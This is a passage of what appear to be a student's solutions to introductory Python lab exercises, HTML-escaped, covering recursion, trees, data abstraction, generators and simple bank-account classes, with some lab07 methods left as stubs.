    &gt;&gt;&gt; can_reach_string = make_onion(add_ing, add_end)&#13;
    &gt;&gt;&gt; can_reach_string('cry', 'crying', 1)      # 'crying' = add_ing('cry')&#13;
    True&#13;
    &gt;&gt;&gt; can_reach_string('un', 'unending', 3)     # 'unending' = add_ing(add_end('un'))&#13;
    True&#13;
    &gt;&gt;&gt; can_reach_string('peach', 'folding', 4)   # Not possible&#13;
    False&#13;
    '''&#13;
    def can_reach(x, y, limit):&#13;
        if limit &lt; 0:&#13;
            return False&#13;
        elif x == y:&#13;
            return True&#13;
        else:&#13;
            return can_reach(f(x), y, limit - 1) or can_reach(g(x), y, limit - 1)&#13;
    return can_reach&#13;
&#13;
&#13;
def mario_number(level):&#13;
    '''Return the number of ways that Mario can perform a sequence of steps&#13;
    or jumps to reach the end of the level without ever landing in a Piranha&#13;
    plant. Assume that every level begins and ends with a space.&#13;
&#13;
    &gt;&gt;&gt; mario_number(' P P ')   # jump, jump&#13;
    1&#13;
    &gt;&gt;&gt; mario_number(' P P  ')   # jump, jump, step&#13;
    1&#13;
    &gt;&gt;&gt; mario_number('  P P ')  # step, jump, jump&#13;
    1&#13;
    &gt;&gt;&gt; mario_number('   P P ') # step, step, jump, jump or jump, jump, jump&#13;
    2&#13;
    &gt;&gt;&gt; mario_number(' P PP ')  # Mario cannot jump two plants&#13;
    0&#13;
    &gt;&gt;&gt; mario_number('    ')    # step, jump ; jump, step ; step, step, step&#13;
    3&#13;
    &gt;&gt;&gt; mario_number('    P    ')&#13;
    9&#13;
    &gt;&gt;&gt; mario_number('   P    P P   P  P P    P     P ')&#13;
    180&#13;
    '''&#13;
    length = len(level)&#13;
    def helper(i):&#13;
        if i == length - 1:&#13;
            return 1&#13;
        elif i == length:&#13;
            return 0&#13;
        if level[i] == 'P':&#13;
            return 0&#13;
        return helper(i + 1) + helper(i + 2)&#13;
    return helper(0)&#13;
&#13;
def max_subseq(n, t):&#13;
    '''&#13;
    Return the maximum subsequence of length at most t that can be found in the given number n.&#13;
    For example, for n = 2012 and t = 2, we have that the subsequences are&#13;
        2&#13;
        0&#13;
        1&#13;
        2&#13;
        20&#13;
        21&#13;
        22&#13;
        01&#13;
        02&#13;
        12&#13;
    and of these, the maxumum number is 22, so our answer is 22.&#13;
&#13;
    &gt;&gt;&gt; max_subseq(2012, 2)&#13;
    22&#13;
    &gt;&gt;&gt; max_subseq(20125, 3)&#13;
    225&#13;
    &gt;&gt;&gt; max_subseq(20125, 5)&#13;
    20125&#13;
    &gt;&gt;&gt; max_subseq(20125, 6) # note that 20125 == 020125&#13;
    20125&#13;
    &gt;&gt;&gt; max_subseq(12345, 3)&#13;
    345&#13;
    &gt;&gt;&gt; max_subseq(12345, 0) # 0 is of length 0&#13;
    0&#13;
    &gt;&gt;&gt; max_subseq(12345, 1)&#13;
    5&#13;
    '''&#13;
&#13;
    if t == 0:&#13;
        return 0&#13;
    if n == 0:&#13;
        return 0&#13;
    return max(n % 10 + 10 * max_subseq(n // 10 ,t - 1), max_subseq(n // 10 ,t))&#13;
     &#13;
    &#13;
def is_prime(n):&#13;
    '''&#13;
    &gt;&gt;&gt; is_prime(7)&#13;
    True&#13;
    &gt;&gt;&gt; is_prime(10)&#13;
    False&#13;
    &gt;&gt;&gt; is_prime(1)&#13;
    False&#13;
    '''&#13;
    assert n &gt; 0, 'n must be larger than 0'&#13;
    &#13;
    if n == 1:&#13;
        return False&#13;
&#13;
    def helper(i):&#13;
        if i == n:&#13;
            return True&#13;
        if n % i == 0:&#13;
            return False&#13;
        return helper(i + 1)&#13;
&#13;
    return helper(2)&#13;
```&#13;
&#13;
## lab04&#13;
&#13;
&#13;
&#13;
```python&#13;
LAB_SOURCE_FILE=__file__&#13;
&#13;
&#13;
def flatten(s):&#13;
    '''Returns a flattened version of list s.&#13;
&#13;
    &gt;&gt;&gt; flatten([1, 2, 3])&#13;
    [1, 2, 3]&#13;
    &gt;&gt;&gt; deep = [1, [[2], 3], 4, [5, 6]]&#13;
    &gt;&gt;&gt; flatten(deep)&#13;
    [1, 2, 3, 4, 5, 6]&#13;
    &gt;&gt;&gt; deep                                # input list is unchanged&#13;
    [1, [[2], 3], 4, [5, 6]]&#13;
    &gt;&gt;&gt; very_deep = [['m', ['i', ['n', ['m', 'e', ['w', 't', ['a'], 't', 'i', 'o'], 'n']], 's']]]&#13;
    &gt;&gt;&gt; flatten(very_deep)&#13;
    ['m', 'i', 'n', 'm', 'e', 'w', 't', 'a', 't', 'i', 'o', 'n', 's']&#13;
    '''&#13;
    if type(s) != list:&#13;
      return [s]&#13;
    lst = []&#13;
    for i in s:&#13;
      lst += flatten(i)&#13;
    return lst&#13;
&#13;
&#13;
def merge(s, t):&#13;
    '''Merges two sorted lists.&#13;
&#13;
    &gt;&gt;&gt; s1 = [1, 3, 5]&#13;
    &gt;&gt;&gt; s2 = [2, 4, 6]&#13;
    &gt;&gt;&gt; merge(s1, s2)&#13;
    [1, 2, 3, 4, 5, 6]&#13;
    &gt;&gt;&gt; s1&#13;
    [1, 3, 5]&#13;
    &gt;&gt;&gt; s2&#13;
    [2, 4, 6]&#13;
    &gt;&gt;&gt; merge([], [2, 4, 6])&#13;
    [2, 4, 6]&#13;
    &gt;&gt;&gt; merge([1, 2, 3], [])&#13;
    [1, 2, 3]&#13;
    &gt;&gt;&gt; merge([5, 7], [2, 4, 6])&#13;
    [2, 4, 5, 6, 7]&#13;
    &gt;&gt;&gt; merge([2, 3, 4], [2, 4, 6])&#13;
    [2, 2, 3, 4, 4, 6]&#13;
    &gt;&gt;&gt; from construct_check import check&#13;
    &gt;&gt;&gt; check(LAB_SOURCE_FILE, 'merge', ['While', 'For'])    # ban iteration&#13;
    True&#13;
    '''&#13;
    if len(s) == 0:&#13;
      return t[:]&#13;
    elif len(t) == 0:&#13;
      return s[:]&#13;
    val = min(s[0], t[0])&#13;
    if (s[0] == val):&#13;
      return [val] + merge(s[1:], t)&#13;
    else:&#13;
      return [val] + merge(s, t[1:])&#13;
&#13;
        &#13;
&#13;
&#13;
&#13;
def size_of_tree(t):&#13;
    '''Return the number of entries in the tree.&#13;
    &gt;&gt;&gt; numbers = tree(1, [tree(2), tree(3, [tree(4), tree(5)]), tree(6, [tree(7)])])&#13;
    &gt;&gt;&gt; print_tree(numbers)&#13;
    1&#13;
      2&#13;
      3&#13;
        4&#13;
        5&#13;
      6&#13;
        7&#13;
    &gt;&gt;&gt; size_of_tree(numbers)&#13;
    7&#13;
    '''&#13;
    if is_leaf(t):&#13;
      return 1&#13;
    return 1 + sum([size_of_tree(b) for b in branches(t)])&#13;
&#13;
&#13;
def replace_loki_at_leaf(t, lokis_replacement):&#13;
    '''Returns a new tree where every leaf value equal to 'loki' has&#13;
    been replaced with lokis_replacement.&#13;
&#13;
    &gt;&gt;&gt; yggdrasil = tree('odin',&#13;
    ...                  [tree('balder',&#13;
    ...                        [tree('loki'),&#13;
    ...                         tree('freya')]),&#13;
    ...                   tree('frigg',&#13;
    ...                        [tree('loki')]),&#13;
    ...                   tree('loki',&#13;
    ...                        [tree('sif'),&#13;
    ...                         tree('loki')]),&#13;
    ...                   tree('loki')])&#13;
    &gt;&gt;&gt; laerad = copy_tree(yggdrasil)    # copy yggdrasil for testing purposes&#13;
    &gt;&gt;&gt; print_tree(replace_loki_at_leaf(yggdrasil, 'freya'))&#13;
    odin&#13;
      balder&#13;
        freya&#13;
        freya&#13;
      frigg&#13;
        freya&#13;
      loki&#13;
        sif&#13;
        freya&#13;
      freya&#13;
    &gt;&gt;&gt; laerad == yggdrasil    # Make sure original tree is unmodified&#13;
    True&#13;
    '''&#13;
    if is_leaf(t):&#13;
        if label(t) == 'loki':&#13;
            return tree(lokis_replacement)&#13;
        return tree(label(t))&#13;
    return tree(label(t), [replace_loki_at_leaf(b, lokis_replacement) for b in branches(t)])&#13;
&#13;
&#13;
&#13;
def divide(quotients, divisors):&#13;
    '''Return a dictonary in which each quotient q is a key for the list of&#13;
    divisors that it divides evenly.&#13;
&#13;
    &gt;&gt;&gt; divide([3, 4, 5], [8, 9, 10, 11, 12])&#13;
    {3: [9, 12], 4: [8, 12], 5: [10]}&#13;
    &gt;&gt;&gt; divide(range(1, 5), range(20, 25))&#13;
    {1: [20, 21, 22, 23, 24], 2: [20, 22, 24], 3: [21, 24], 4: [20, 24]}&#13;
    '''&#13;
    return {i: [j for j in divisors if j % i == 0] for i in quotients}&#13;
&#13;
&#13;
&#13;
&#13;
# Tree Data Abstraction&#13;
&#13;
def tree(label, branches=[]):&#13;
    '''Construct a tree with the given label value and a list of branches.'''&#13;
    for branch in branches:&#13;
        assert is_tree(branch), 'branches must be trees'&#13;
    return [label] + list(branches)&#13;
&#13;
def label(tree):&#13;
    '''Return the label value of a tree.'''&#13;
    return tree[0]&#13;
&#13;
def branches(tree):&#13;
    '''Return the list of branches of the given tree.'''&#13;
    return tree[1:]&#13;
&#13;
def is_tree(tree):&#13;
    '''Returns True if the given tree is a tree, and False otherwise.'''&#13;
    if type(tree) != list or len(tree) &lt; 1:&#13;
        return False&#13;
    for branch in branches(tree):&#13;
        if not is_tree(branch):&#13;
            return False&#13;
    return True&#13;
&#13;
def is_leaf(tree):&#13;
    '''Returns True if the given tree's list of branches is empty, and False&#13;
    otherwise.&#13;
    '''&#13;
    return not branches(tree)&#13;
&#13;
def print_tree(t, indent=0):&#13;
    '''Print a representation of this tree in which each node is&#13;
    indented by two spaces times its depth from the root.&#13;
&#13;
    &gt;&gt;&gt; print_tree(tree(1))&#13;
    1&#13;
    &gt;&gt;&gt; print_tree(tree(1, [tree(2)]))&#13;
    1&#13;
      2&#13;
    &gt;&gt;&gt; numbers = tree(1, [tree(2), tree(3, [tree(4), tree(5)]), tree(6, [tree(7)])])&#13;
    &gt;&gt;&gt; print_tree(numbers)&#13;
    1&#13;
      2&#13;
      3&#13;
        4&#13;
        5&#13;
      6&#13;
        7&#13;
    '''&#13;
    print('  ' * indent + str(label(t)))&#13;
    for b in branches(t):&#13;
        print_tree(b, indent + 1)&#13;
&#13;
def copy_tree(t):&#13;
    '''Returns a copy of t. Only for testing purposes.&#13;
&#13;
    &gt;&gt;&gt; t = tree(5)&#13;
    &gt;&gt;&gt; copy = copy_tree(t)&#13;
    &gt;&gt;&gt; t = tree(6)&#13;
    &gt;&gt;&gt; print_tree(copy)&#13;
    5&#13;
    '''&#13;
    return tree(label(t), [copy_tree(b) for b in branches(t)])&#13;
```&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
## lab05&#13;
&#13;
```python&#13;
def partial_reverse(s, start):&#13;
    '''Reverse part of a list in-place, starting with start up to the end of&#13;
    the list.&#13;
&#13;
    &gt;&gt;&gt; a = [1, 2, 3, 4, 5, 6, 7]&#13;
    &gt;&gt;&gt; partial_reverse(a, 2)&#13;
    &gt;&gt;&gt; a&#13;
    [1, 2, 7, 6, 5, 4, 3]&#13;
    &gt;&gt;&gt; partial_reverse(a, 5)&#13;
    &gt;&gt;&gt; a&#13;
    [1, 2, 7, 6, 5, 3, 4]&#13;
    '''&#13;
    def helper(i):&#13;
        if i &lt; (len(s) - start) // 2:&#13;
            s[start + i], s[len(s) - i - 1] = s[len(s) - i - 1], s[start + i]&#13;
            helper(i + 1)&#13;
&#13;
    return helper(0)&#13;
&#13;
&#13;
&#13;
&#13;
def group_by(s, fn):&#13;
    '''Return a dictionary of lists that together contain the elements of s.&#13;
    The key for each list is the value that fn returns when called on any of the&#13;
    values of that list.&#13;
&#13;
    &gt;&gt;&gt; group_by([12, 23, 14, 45], lambda p: p // 10)&#13;
    {1: [12, 14], 2: [23], 4: [45]}&#13;
    &gt;&gt;&gt; group_by(range(-3, 4), lambda x: x * x)&#13;
    {9: [-3, 3], 4: [-2, 2], 1: [-1, 1], 0: [0]}&#13;
    '''&#13;
    grouped = {}&#13;
    for i in s:&#13;
        key = fn(i)&#13;
        if key in grouped:&#13;
            grouped[key] += [i]&#13;
        else:&#13;
            grouped[key] = [i]&#13;
    return grouped&#13;
&#13;
&#13;
from math import sqrt&#13;
&#13;
def distance(city_a, city_b):&#13;
    '''&#13;
    &gt;&gt;&gt; city_a = make_city('city_a', 0, 1)&#13;
    &gt;&gt;&gt; city_b = make_city('city_b', 0, 2)&#13;
    &gt;&gt;&gt; distance(city_a, city_b)&#13;
    1.0&#13;
    &gt;&gt;&gt; city_c = make_city('city_c', 6.5, 12)&#13;
    &gt;&gt;&gt; city_d = make_city('city_d', 2.5, 15)&#13;
    &gt;&gt;&gt; distance(city_c, city_d)&#13;
    5.0&#13;
    '''&#13;
    return sqrt((get_lat(city_a) - get_lat(city_b)) ** 2 + (get_lon(city_a) - get_lon(city_b)) ** 2)&#13;
&#13;
def closer_city(lat, lon, city_a, city_b):&#13;
    '''&#13;
    Returns the name of either city_a or city_b, whichever is closest to&#13;
    coordinate (lat, lon). If the two cities are the same distance away&#13;
    from the coordinate, consider city_b to be the closer city.&#13;
&#13;
    &gt;&gt;&gt; berkeley = make_city('Berkeley', 37.87, 112.26)&#13;
    &gt;&gt;&gt; stanford = make_city('Stanford', 34.05, 118.25)&#13;
    &gt;&gt;&gt; closer_city(38.33, 121.44, berkeley, stanford)&#13;
    'Stanford'&#13;
    &gt;&gt;&gt; bucharest = make_city('Bucharest', 44.43, 26.10)&#13;
    &gt;&gt;&gt; vienna = make_city('Vienna', 48.20, 16.37)&#13;
    &gt;&gt;&gt; closer_city(41.29, 174.78, bucharest, vienna)&#13;
    'Bucharest'&#13;
    '''&#13;
    city_c =  make_city('city_c', lat, lon)&#13;
    distance_1 = distance(city_a, city_c)&#13;
    distance_2 = distance(city_b, city_c)&#13;
&#13;
    if distance_1 &lt; distance_2:&#13;
        return get_name(city_a)    &#13;
    return get_name(city_b)    &#13;
&#13;
&#13;
def check_city_abstraction():&#13;
    '''&#13;
    There's nothing for you to do for this function, it's just here for the extra doctest&#13;
    &gt;&gt;&gt; change_abstraction(True)&#13;
    &gt;&gt;&gt; city_a = make_city('city_a', 0, 1)&#13;
    &gt;&gt;&gt; city_b = make_city('city_b', 0, 2)&#13;
    &gt;&gt;&gt; distance(city_a, city_b)&#13;
    1.0&#13;
    &gt;&gt;&gt; city_c = make_city('city_c', 6.5, 12)&#13;
    &gt;&gt;&gt; city_d = make_city('city_d', 2.5, 15)&#13;
    &gt;&gt;&gt; distance(city_c, city_d)&#13;
    5.0&#13;
    &gt;&gt;&gt; berkeley = make_city('Berkeley', 37.87, 112.26)&#13;
    &gt;&gt;&gt; stanford = make_city('Stanford', 34.05, 118.25)&#13;
    &gt;&gt;&gt; closer_city(38.33, 121.44, berkeley, stanford)&#13;
    'Stanford'&#13;
    &gt;&gt;&gt; bucharest = make_city('Bucharest', 44.43, 26.10)&#13;
    &gt;&gt;&gt; vienna = make_city('Vienna', 48.20, 16.37)&#13;
    &gt;&gt;&gt; closer_city(41.29, 174.78, bucharest, vienna)&#13;
    'Bucharest'&#13;
    &gt;&gt;&gt; change_abstraction(False)&#13;
    '''&#13;
&#13;
# Treat all the following code as being behind an abstraction layer,&#13;
# you shouldn't need to look at it.&#13;
def make_city(name, lat, lon):&#13;
    '''&#13;
    &gt;&gt;&gt; city = make_city('Berkeley', 0, 1)&#13;
    &gt;&gt;&gt; get_name(city)&#13;
    'Berkeley'&#13;
    &gt;&gt;&gt; get_lat(city)&#13;
    0&#13;
    &gt;&gt;&gt; get_lon(city)&#13;
    1&#13;
    '''&#13;
    if change_abstraction.changed:&#13;
        return {'name' : name, 'lat' : lat, 'lon' : lon}&#13;
    else:&#13;
        return [name, lat, lon]&#13;
&#13;
def get_name(city):&#13;
    '''&#13;
    &gt;&gt;&gt; city = make_city('Berkeley', 0, 1)&#13;
    &gt;&gt;&gt; get_name(city)&#13;
    'Berkeley'&#13;
    '''&#13;
    if change_abstraction.changed:&#13;
        return city['name']&#13;
    else:&#13;
        return city[0]&#13;
&#13;
def get_lat(city):&#13;
    '''&#13;
    &gt;&gt;&gt; city = make_city('Berkeley', 0, 1)&#13;
    &gt;&gt;&gt; get_lat(city)&#13;
    0&#13;
    '''&#13;
    if change_abstraction.changed:&#13;
        return city['lat']&#13;
    else:&#13;
        return city[1]&#13;
&#13;
def get_lon(city):&#13;
    '''&#13;
    &gt;&gt;&gt; city = make_city('Berkeley', 0, 1)&#13;
    &gt;&gt;&gt; get_lon(city)&#13;
    1&#13;
    '''&#13;
    if change_abstraction.changed:&#13;
        return city['lon']&#13;
    else:&#13;
        return city[2]&#13;
&#13;
###############&#13;
&#13;
&#13;
def change_abstraction(change):&#13;
    '''&#13;
    For testing purposes.&#13;
    &gt;&gt;&gt; change_abstraction(True)&#13;
    &gt;&gt;&gt; change_abstraction.changed&#13;
    True&#13;
    '''&#13;
    change_abstraction.changed = change&#13;
&#13;
change_abstraction.changed = False&#13;
```&#13;
&#13;
&#13;
&#13;
## lab06&#13;
&#13;
&#13;
&#13;
```python&#13;
def count_occurrences(t, n, x):&#13;
    '''Return the number of times that x is equal to one of the&#13;
    first n elements of iterator t.&#13;
&#13;
    &gt;&gt;&gt; s = iter([10, 9, 10, 9, 9, 10, 8, 8, 8, 7])&#13;
    &gt;&gt;&gt; count_occurrences(s, 10, 9)&#13;
    3&#13;
    &gt;&gt;&gt; t = iter([10, 9, 10, 9, 9, 10, 8, 8, 8, 7])&#13;
    &gt;&gt;&gt; count_occurrences(t, 3, 10)&#13;
    2&#13;
    &gt;&gt;&gt; u = iter([3, 2, 2, 2, 1, 2, 1, 4, 4, 5, 5, 5])&#13;
    &gt;&gt;&gt; count_occurrences(u, 1, 3)  # Only iterate over 3&#13;
    1&#13;
    &gt;&gt;&gt; count_occurrences(u, 3, 2)  # Only iterate over 2, 2, 2&#13;
    3&#13;
    &gt;&gt;&gt; list(u)                     # Ensure that the iterator has advanced the right amount&#13;
    [1, 2, 1, 4, 4, 5, 5, 5]&#13;
    &gt;&gt;&gt; v = iter([4, 1, 6, 6, 7, 7, 6, 6, 2, 2, 2, 5])&#13;
    &gt;&gt;&gt; count_occurrences(v, 6, 6)&#13;
    2&#13;
    '''&#13;
    total = 0&#13;
    for i in range(n):&#13;
        y = next(t)&#13;
        if x == y:&#13;
            total += 1&#13;
    return total&#13;
&#13;
&#13;
&#13;
def hailstone(n):&#13;
    '''Yields the elements of the hailstone sequence starting at n.&#13;
&#13;
    &gt;&gt;&gt; for num in hailstone(10):&#13;
    ...     print(num)&#13;
    10&#13;
    5&#13;
    16&#13;
    8&#13;
    4&#13;
    2&#13;
    1&#13;
    '''&#13;
    yield n&#13;
    if n == 1:&#13;
        return None&#13;
    if n % 2 == 0:&#13;
        yield from hailstone(n // 2)&#13;
    else:&#13;
        yield from hailstone(n * 3 + 1)&#13;
&#13;
&#13;
def merge(incr_a, incr_b):&#13;
    '''Yield the elements of strictly increasing iterables incr_a and incr_b, removing&#13;
    repeats. Assume that incr_a and incr_b have no repeats. incr_a or incr_b may or may not&#13;
    be infinite sequences.&#13;
&#13;
    &gt;&gt;&gt; m = merge([0, 2, 4, 6, 8, 10, 12, 14], [0, 3, 6, 9, 12, 15])&#13;
    &gt;&gt;&gt; type(m)&#13;
    &lt;class 'generator'&gt;&#13;
    &gt;&gt;&gt; list(m)&#13;
    [0, 2, 3, 4, 6, 8, 9, 10, 12, 14, 15]&#13;
    &gt;&gt;&gt; def big(n):&#13;
    ...    k = 0&#13;
    ...    while True: yield k; k += n&#13;
    &gt;&gt;&gt; m = merge(big(2), big(3))&#13;
    &gt;&gt;&gt; [next(m) for _ in range(11)]&#13;
    [0, 2, 3, 4, 6, 8, 9, 10, 12, 14, 15]&#13;
    '''&#13;
    iter_a, iter_b = iter(incr_a), iter(incr_b)&#13;
    next_a, next_b = next(iter_a, None), next(iter_b, None)&#13;
&#13;
    if next_a == None and next_b == None:&#13;
        yield None&#13;
    elif next_b == None:&#13;
        yield next_a&#13;
        yield from iter_a&#13;
    elif next_a == None:&#13;
        yield next_b&#13;
        yield from iter_b&#13;
    else:&#13;
        if next_a == next_b:&#13;
            yield next_a&#13;
            yield from merge(iter_a, iter_b)&#13;
        elif next_a &lt; next_b:&#13;
            yield next_a&#13;
            yield from merge(iter_a, merge([next_b], iter_b))&#13;
        else:&#13;
            yield next_b&#13;
            yield from merge(merge([next_a], iter_a), iter_b)&#13;
&#13;
def deep_map(f, s):&#13;
    '''Replace all non-list elements x with f(x) in the nested list s.&#13;
&#13;
    &gt;&gt;&gt; six = [1, 2, [3, [4], 5], 6]&#13;
    &gt;&gt;&gt; deep_map(lambda x: x * x, six)&#13;
    &gt;&gt;&gt; six&#13;
    [1, 4, [9, [16], 25], 36]&#13;
    &gt;&gt;&gt; # Check that you're not making new lists&#13;
    &gt;&gt;&gt; s = [3, [1, [4, [1]]]]&#13;
    &gt;&gt;&gt; s1 = s[1]&#13;
    &gt;&gt;&gt; s2 = s1[1]&#13;
    &gt;&gt;&gt; s3 = s2[1]&#13;
    &gt;&gt;&gt; deep_map(lambda x: x + 1, s)&#13;
    &gt;&gt;&gt; s&#13;
    [4, [2, [5, [2]]]]&#13;
    &gt;&gt;&gt; s1 is s[1]&#13;
    True&#13;
    &gt;&gt;&gt; s2 is s1[1]&#13;
    True&#13;
    &gt;&gt;&gt; s3 is s2[1]&#13;
    True&#13;
    '''&#13;
    for i in range(len(s)):&#13;
        if isinstance(s[i], list):&#13;
            deep_map(f, s[i])&#13;
        else:&#13;
            s[i] = f(s[i])&#13;
&#13;
&#13;
&#13;
def buy(required_fruits, prices, total_amount):&#13;
    '''Print ways to buy some of each fruit so that the sum of prices is amount.&#13;
&#13;
    &gt;&gt;&gt; prices = {'oranges': 4, 'apples': 3, 'bananas': 2, 'kiwis': 9}&#13;
    &gt;&gt;&gt; buy(['apples', 'oranges', 'bananas'], prices, 12)&#13;
    [2 apples][1 orange][1 banana]&#13;
    &gt;&gt;&gt; buy(['apples', 'oranges', 'bananas'], prices, 16)&#13;
    [2 apples][1 orange][3 bananas]&#13;
    [2 apples][2 oranges][1 banana]&#13;
    &gt;&gt;&gt; buy(['apples', 'kiwis'], prices, 36)&#13;
    [3 apples][3 kiwis]&#13;
    [6 apples][2 kiwis]&#13;
    [9 apples][1 kiwi]&#13;
    '''&#13;
    def add(fruits, amount, cart):&#13;
        if fruits == [] and amount == 0:&#13;
            print(cart)&#13;
        elif fruits and amount &gt; 0:&#13;
            fruit = fruits[0]&#13;
            price = prices[fruit]&#13;
            for k in range(1, amount // price + 1):&#13;
                add(fruits[1:], amount - k * price, cart + display(fruit, k))&#13;
    add(required_fruits, total_amount, '')&#13;
&#13;
&#13;
def display(fruit, count):&#13;
    '''Display a count of a fruit in square brackets.&#13;
&#13;
    &gt;&gt;&gt; display('apples', 3)&#13;
    '[3 apples]'&#13;
    &gt;&gt;&gt; display('apples', 1)&#13;
    '[1 apple]'&#13;
    '''&#13;
    assert count &gt;= 1 and fruit[-1] == 's'&#13;
    if count == 1:&#13;
        fruit = fruit[:-1]  # get rid of the plural s&#13;
    return '[' + str(count) + ' ' + fruit + ']'&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
## lab07&#13;
&#13;
&#13;
&#13;
```python&#13;
passphrase = 'REPLACE_THIS_WITH_PASSPHRASE'&#13;
&#13;
def midsem_survey(p):&#13;
    '''&#13;
    You do not need to understand this code.&#13;
    &gt;&gt;&gt; midsem_survey(passphrase)&#13;
    'c20d4e5854c4c9cdfd14626aad39bd5a1e2ed9bb30dca56d5643a3ad'&#13;
    '''&#13;
    import hashlib&#13;
    return hashlib.sha224(p.encode('utf-8')).hexdigest()&#13;
    &#13;
&#13;
class Account:&#13;
    '''An account has a balance and a holder.&#13;
    &gt;&gt;&gt; a = Account('John')&#13;
    &gt;&gt;&gt; a.deposit(10)&#13;
    10&#13;
    &gt;&gt;&gt; a.balance&#13;
    10&#13;
    &gt;&gt;&gt; a.interest&#13;
    0.02&#13;
    &gt;&gt;&gt; a.time_to_retire(10.25)  # 10 -&gt; 10.2 -&gt; 10.404&#13;
    2&#13;
    &gt;&gt;&gt; a.balance                # Calling time_to_retire method should not change the balance&#13;
    10&#13;
    &gt;&gt;&gt; a.time_to_retire(11)     # 10 -&gt; 10.2 -&gt; ... -&gt; 11.040808032&#13;
    5&#13;
    &gt;&gt;&gt; a.time_to_retire(100)&#13;
    117&#13;
    '''&#13;
    max_withdrawal = 10&#13;
    interest = 0.02&#13;
&#13;
    def __init__(self, account_holder):&#13;
        self.balance = 0&#13;
        self.holder = account_holder&#13;
&#13;
    def deposit(self, amount):&#13;
        self.balance = self.balance + amount&#13;
        return self.balance&#13;
&#13;
    def withdraw(self, amount):&#13;
        if amount &gt; self.balance:&#13;
            return 'Insufficient funds'&#13;
        if amount &gt; self.max_withdrawal:&#13;
            return 'Can't withdraw that amount'&#13;
        self.balance = self.balance - amount&#13;
        return self.balance&#13;
&#13;
    def time_to_retire(self, amount):&#13;
        '''Return the number of years until balance would grow to amount.'''&#13;
        assert self.balance &gt; 0 and amount &gt; 0 and self.interest &gt; 0&#13;
        '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
class FreeChecking(Account):&#13;
    '''A bank account that charges for withdrawals, but the first two are free!&#13;
    &gt;&gt;&gt; ch = FreeChecking('Jack')&#13;
    &gt;&gt;&gt; ch.balance = 20&#13;
    &gt;&gt;&gt; ch.withdraw(100)  # First one's free. Still counts as a free withdrawal even though it was unsuccessful&#13;
    'Insufficient funds'&#13;
    &gt;&gt;&gt; ch.withdraw(3)    # Second withdrawal is also free&#13;
    17&#13;
    &gt;&gt;&gt; ch.balance&#13;
    17&#13;
    &gt;&gt;&gt; ch.withdraw(3)    # Ok, two free withdrawals is enough, as free_withdrawals is only 2&#13;
    13&#13;
    &gt;&gt;&gt; ch.withdraw(3)&#13;
    9&#13;
    &gt;&gt;&gt; ch2 = FreeChecking('John')&#13;
    &gt;&gt;&gt; ch2.balance = 10&#13;
    &gt;&gt;&gt; ch2.withdraw(3) # No fee&#13;
    7&#13;
    &gt;&gt;&gt; ch.withdraw(3)  # ch still charges a fee&#13;
    5&#13;
    &gt;&gt;&gt; ch.withdraw(5)  # Not enough to cover fee + withdraw&#13;
    'Insufficient funds'&#13;
    '''&#13;
    withdraw_fee = 1&#13;
    free_withdrawals = 2&#13;
&#13;
    '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
class Transaction:&#13;
    def __init__(self, id, before, after):&#13;
        self.id = id&#13;
        self.before = before&#13;
        self.after = after&#13;
&#13;
    def changed(self):&#13;
        '''Return whether the transaction resulted in a changed balance.'''&#13;
        '*** YOUR CODE HERE ***'&#13;
&#13;
    def report(self):&#13;
        '''Return a string describing the transaction.&#13;
&#13;
        &gt;&gt;&gt; Transaction(3, 20, 10).report()&#13;
        '3: decreased 20-&gt;10'&#13;
        &gt;&gt;&gt; Transaction(4, 20, 50).report()&#13;
        '4: increased 20-&gt;50'&#13;
        &gt;&gt;&gt; Transaction(5, 50, 50).report()&#13;
        '5: no change'&#13;
        '''&#13;
        msg = 'no change'&#13;
        if self.changed():&#13;
            '*** YOUR CODE HERE ***'&#13;
        return str(self.id) + ': ' + msg&#13;
&#13;
class BankAccount:&#13;
    '''A bank account that tracks its transaction history.&#13;
&#13;
    &gt;&gt;&gt; a = BankAccount('Eric')&#13;
    &gt;&gt;&gt; a.deposit(100)    # Transaction 0 for a&#13;
    100&#13;
    &gt;&gt;&gt; b = BankAccount('Erica')&#13;
    &gt;&gt;&gt; a.withdraw(30)    # Transaction 1 for a&#13;
    70&#13;
    &gt;&gt;&gt; a.deposit(10)     # Transaction 2 for a&#13;
    80&#13;
    &gt;&gt;&gt; b.deposit(50)     # Transaction 0 for b&#13;
    50&#13;
    &gt;&gt;&gt; b.withdraw(10)    # Transaction 1 for b&#13;
    40&#13;
    &gt;&gt;&gt; a.withdraw(100)   # Transaction 3 for a&#13;
    'Insufficient funds'&#13;
    &gt;&gt;&gt; len(a.transactions)&#13;
    4&#13;
    &gt;&gt;&gt; len([t for t in a.transactions if t.changed()])&#13;
    3&#13;
    &gt;&gt;&gt; for t in a.transactions:&#13;
    ...     print(t.report())&#13;
    0: increased 0-&gt;100&#13;
    1: decreased 100-&gt;70&#13;
    2: increased 70-&gt;80&#13;
    3: no change&#13;
    &gt;&gt;&gt; b.withdraw(100)   # Transaction 2 for b&#13;
    'Insufficient funds'&#13;
    &gt;&gt;&gt; b.withdraw(30)    # Transaction 3 for b&#13;
    10&#13;
    &gt;&gt;&gt; for t in b.transactions:&#13;
    ...     print(t.report())&#13;
    0: increased 0-&gt;50&#13;
    1: decreased 50-&gt;40&#13;
    2: no change&#13;
    3: decreased 40-&gt;10&#13;
    '''&#13;
&#13;
    # *** YOU NEED TO MAKE CHANGES IN SEVERAL PLACES IN THIS CLASS ***&#13;
&#13;
    def __init__(self, account_holder):&#13;
        self.balance = 0&#13;
        self.holder = account_holder&#13;
&#13;
    def deposit(self, amount):&#13;
        '''Increase the account balance by amount, add the deposit&#13;
        to the transaction history, and return the new balance.&#13;
        '''&#13;
        self.balance = self.balance + amount&#13;
        return self.balance&#13;
&#13;
    def withdraw(self, amount):&#13;
        '''Decrease the account balance by amount, add the withdraw&#13;
        to the transaction history, and return the new balance.&#13;
        '''&#13;
        if amount &gt; self.balance:&#13;
            return 'Insufficient funds'&#13;
        self.balance = self.balance - amount&#13;
        return self.balance&#13;
&#13;
&#13;
&#13;
&#13;
class Email:&#13;
    '''An email has the following instance attributes:&#13;
&#13;
        msg (str): the contents of the message&#13;
        sender (Client): the client that sent the email&#13;
        recipient_name (str): the name of the recipient (another client)&#13;
    '''&#13;
    def __init__(self, msg, sender, recipient_name):&#13;
        self.msg = msg&#13;
        self.sender = sender&#13;
        self.recipient_name = recipient_name&#13;
&#13;
class Server:&#13;
